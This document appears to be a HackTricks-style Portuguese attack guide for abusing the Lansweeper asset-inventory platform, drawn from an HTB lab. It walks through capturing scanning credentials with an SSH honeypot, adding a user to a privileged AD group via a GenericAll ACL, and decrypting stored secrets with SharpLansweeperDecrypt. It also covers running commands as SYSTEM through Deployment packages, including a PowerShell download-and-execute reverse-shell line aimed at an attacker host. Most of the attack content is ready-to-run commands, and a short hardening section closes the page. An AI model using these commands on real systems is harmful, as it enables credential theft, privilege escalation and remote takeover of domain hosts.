# Lansweeper Abuse: Harvesting de Credenciais, Descriptografia de Secrets e RCE via Deployment

{{#include ../../banners/hacktricks-training.md}}

Lansweeper é uma plataforma de descoberta e inventário de ativos de TI normalmente implantada no Windows e integrada ao Active Directory. As credenciais configuradas no Lansweeper são usadas pelos seus mecanismos de scanning para autenticar-se em ativos por meio de protocolos como SSH, SMB/WMI e WinRM. Misconfigurations frequentemente permitem:

- Interceptação de credenciais ao redirecionar um scanning target para um host controlado pelo atacante (honeypot)
- Abuso de AD ACLs expostas por grupos relacionados ao Lansweeper para obter acesso remoto
- Descriptografia on-host de secrets configurados no Lansweeper (connection strings e credenciais de scanning armazenadas)
- Execução de código em endpoints gerenciados por meio da feature Deployment (frequentemente executada como SYSTEM)

Esta página resume workflows e comandos práticos de atacante para abusar desses comportamentos durante engagements.

## 1) Harvesting de credenciais de scanning via honeypot (exemplo com SSH)

Ideia: criar um Scanning Target que aponte para o seu host e associar a ele Scanning Credentials existentes. Quando o scan for executado, o Lansweeper tentará autenticar-se com essas credenciais, e o seu honeypot irá capturá-las.<sup>[[1]](#references)</sup>

Visão geral das etapas (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (ou Single IP) = seu IP da VPN
- Configure a porta SSH para algo acessível (por exemplo, 2022 se a 22 estiver bloqueada)
- Desative o schedule e planeje acioná-lo manualmente
- Scanning → Scanning Credentials → certifique-se de que existam credenciais Linux/SSH; associe-as ao novo target (ative todas conforme necessário)
- Clique em “Scan now” no target
- Execute um honeypot SSH e obtenha o username/password usado na tentativa

Exemplo com sshesame:<sup>[[2]](#references)</sup>
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Validar credenciais capturadas nos serviços do DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notas
- Funciona de forma semelhante para outros protocolos quando você consegue coagir o scanner a se conectar ao seu listener (honeypots de SMB/WinRM etc.). SSH costuma ser a opção mais simples.
- Muitos scanners se identificam com client banners distintos (por exemplo, RebexSSH) e tentarão executar comandos benignos (uname, whoami etc.).

## 2) AD ACL abuse: obtenha acesso remoto adicionando a si mesmo a um grupo de administradores de aplicativos

Use BloodHound para enumerar os direitos efetivos da conta comprometida. Uma descoberta comum é um grupo específico do scanner ou aplicativo (por exemplo, “Lansweeper Discovery”) com GenericAll sobre um grupo privilegiado (por exemplo, “Lansweeper Admins”). Se o grupo privilegiado também for membro de “Remote Management Users”, o WinRM ficará disponível assim que adicionarmos a nós mesmos.<sup>[[1]](#references)[[5]](#references)</sup>

Exemplos de coleta:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Explorar GenericAll em grupo com BloodyAD (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Então, obtenha um shell interativo:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Dica: as operações do Kerberos são sensíveis ao tempo. Se você encontrar KRB_AP_ERR_SKEW, sincronize com o DC primeiro:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Descriptografar secrets configurados pelo Lansweeper no host

No servidor do Lansweeper, o site ASP.NET normalmente armazena uma connection string criptografada e uma symmetric key usada pela aplicação. Com acesso local apropriado, você pode descriptografar a connection string do DB e depois extrair as credenciais de scanning armazenadas.<sup>[[1]](#references)</sup>

Localizações típicas:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Use SharpLansweeperDecrypt para automatizar a descriptografia e o dump das credenciais armazenadas:<sup>[[3]](#references)</sup>
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
A saída esperada inclui detalhes de conexão com o DB e credenciais de scanning em texto simples, como contas Windows e Linux usadas em todo o ambiente. Essas contas geralmente têm privilégios locais elevados nos hosts do domínio:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Use credenciais de scanning do Windows recuperadas para acesso privilegiado:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Como membro de “Lansweeper Admins”, a web UI expõe Deployment e Configuration. Em Deployment → Deployment packages, é possível criar packages que executam comandos arbitrários nos assets selecionados. A execução é realizada pelo serviço do Lansweeper com altos privilégios, resultando em code execution como NT AUTHORITY\SYSTEM no host selecionado.<sup>[[1]](#references)</sup>

Etapas de alto nível:
- Crie um novo Deployment package que execute um one-liner em PowerShell ou cmd (reverse shell, add-user etc.).
- Selecione o asset desejado (por exemplo, o DC/host onde o Lansweeper é executado) e clique em Deploy/Run now.
- Capture seu shell como SYSTEM.

Payloads de exemplo (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- As ações de Deployment são ruidosas e deixam logs no Lansweeper e nos logs de eventos do Windows. Use com critério.

## Detecção e hardening

- Restrinja ou remova enumerações SMB anônimas. Monitore RID cycling e acessos anômalos aos compartilhamentos do Lansweeper.
- Controles de saída: bloqueie ou restrinja rigorosamente SSH/SMB/WinRM de saída a partir dos hosts de scanner. Gere alertas para portas não padrão (por exemplo, 2022) e client banners incomuns, como Rebex.
- Proteja `Website\\web.config` e `Key\\Encryption.txt`. Externalize os secrets para um vault e faça a rotação quando houver exposição. Considere service accounts com privilégios mínimos e gMSA quando viável.
- Monitoramento de AD: gere alertas para alterações em grupos relacionados ao Lansweeper (por exemplo, “Lansweeper Admins”, “Remote Management Users”) e para alterações em ACLs que concedam GenericAll/Write membership em grupos privilegiados.
- Audite a criação, alteração e execução de pacotes de Deployment; gere alertas para pacotes que iniciem cmd.exe/powershell.exe ou conexões de saída inesperadas.

## Tópicos relacionados
- Enumeração SMB/LSA/SAMR e RID cycling
- Password spraying de Kerberos e considerações sobre clock skew
- Análise de caminhos do BloodHound em grupos de application-admin
- Uso do WinRM e lateral movement

## Referências
- [1] [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
